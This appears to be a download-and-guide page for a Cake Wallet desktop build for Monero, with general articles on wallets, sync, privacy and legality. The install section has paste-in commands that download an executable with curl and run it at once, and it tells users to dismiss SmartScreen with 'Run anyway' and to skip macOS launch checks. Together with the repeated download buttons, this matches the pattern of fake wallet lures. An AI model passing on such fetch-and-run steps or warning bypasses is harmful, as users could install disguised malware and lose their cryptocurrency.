![Cake Wallet monero guide](assets/cake-wallet-monero-article-banner.png)

# Use Cake Wallet for Monero

The XMR hub: wallets, sync, privacy, buying and the legality question.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Cake Wallet creates and restores Monero wallets, syncs them through a node, and supports accounts, subaddresses, restore height, rescan and Tor. You can buy or swap XMR inside the app. It is a non-custodial wallet, so the phrase is the wallet and the node is the connection.

<!-- ARTICLE-BODY-BEGIN -->

## Creating an XMR wallet
Add a wallet, choose Monero, and either create a new one or restore from a phrase, keys or a backup file. Creation produces a 25-word seed; write it down before you fund anything.

A restore asks for the seed type and, optionally, a restore height. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-restore-wallet.md">Restore a Cake Wallet wallet</a> covers the 25-word Legacy case and the height field, which decides how long the first sync takes.

## Sync and node choices
The wallet reads the chain through a node. A first sync from a recent height takes minutes to hours; from an old height it can take much longer, and the block counter is the only honest progress indicator.

A remote node sees your queries, which is why privacy-minded users run their own. <a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-monero-sync.md">Cake Wallet Monero sync problems</a> covers stalled syncs, and why changing nodes comes before rescanning.

## Accounts and subaddresses
Inside one Monero wallet you can keep several accounts, and each account issues subaddresses. Funds sent to a subaddress belong to the account above it, which is why the wrong account open looks empty.

<a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-multiple-wallets.md">Manage multiple wallets in Cake Wallet</a> covers the level above, where a separate phrase and a separate balance begin.

## Privacy settings
Monero hides sender, receiver and amount at protocol level. On top of that, the wallet can route through Tor so the node does not see your IP, and the view key stays on the device so balance checks do not leak it.

<a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-tor-orbot.md">Use Tor with Cake Wallet</a> covers the network layer, including the platform requirements and what Tor does not hide.

## Buying or swapping XMR
Buying uses a provider with its own checks and regional limits; swapping converts a coin you already hold without a fiat provider. For small amounts the swap is usually cheaper and faster.

<a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-buy-monero.md">Buy Monero with Cake Wallet</a> explains both, including why a card purchase carries a paper trail that a swap does not.

## Sending XMR to the wallet
Share an address from the account you want the funds in, and choose the Monero network on the sending side. A deposit from an exchange usually needs a few confirmations before it is spendable.

If it does not appear, check the account and the confirmations before anything else. The address format is different from Bitcoin and Ethereum, so a mis-send across coins is unrecoverable by design.

## Legality and tracing
Monero is legal in most jurisdictions and restricted or delisted by some service providers for compliance reasons. That is a provider decision as much as a legal one, and it varies by country.

A Monero wallet cannot be traced by reading the chain the way a transparent one can, but the way you acquired the coins can still link them to you. Nothing here is legal advice.

## Install the build
Install the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">current Cake Wallet release</a> and confirm the Monero wallet opens and syncs before you move funds into it. A build that is behind is the most common reason a feature discussed here appears missing.

## FAQ
### Is Cake Wallet good for Monero?
Yes: accounts, subaddresses, restore height, rescan, node choice and Tor are all supported, which makes it a strong pick as a wallet for storing XMR as well as spending it.
### Can a Monero wallet be traced?
The chain hides sender, receiver and amount. Linking coins to a person depends on how they were acquired and spent, not on the wallet.
### Is it illegal to own Monero?
In most countries it is legal. Some providers restrict it for compliance reasons; check your jurisdiction.
### What is Monero GUI or the RPC?
The official desktop wallet and its programming interface. They are separate software from Cake Wallet, which uses a node but is its own app.
### Where are Monero wallets stored?
On your device, in the app's data, protected by the PIN. The phrase is the portable copy.
### How do I convert BTC to XMR in Cake Wallet?
Use the swap flow: choose BTC as the send coin and XMR as the receive coin, compare quotes, and confirm.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[Cake Wallet Monero sync problems](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-monero-sync.md) · [manage multiple wallets in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-multiple-wallets.md) · [buy Monero with Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-buy-monero.md) · [use Tor with Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-tor-orbot.md) · [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
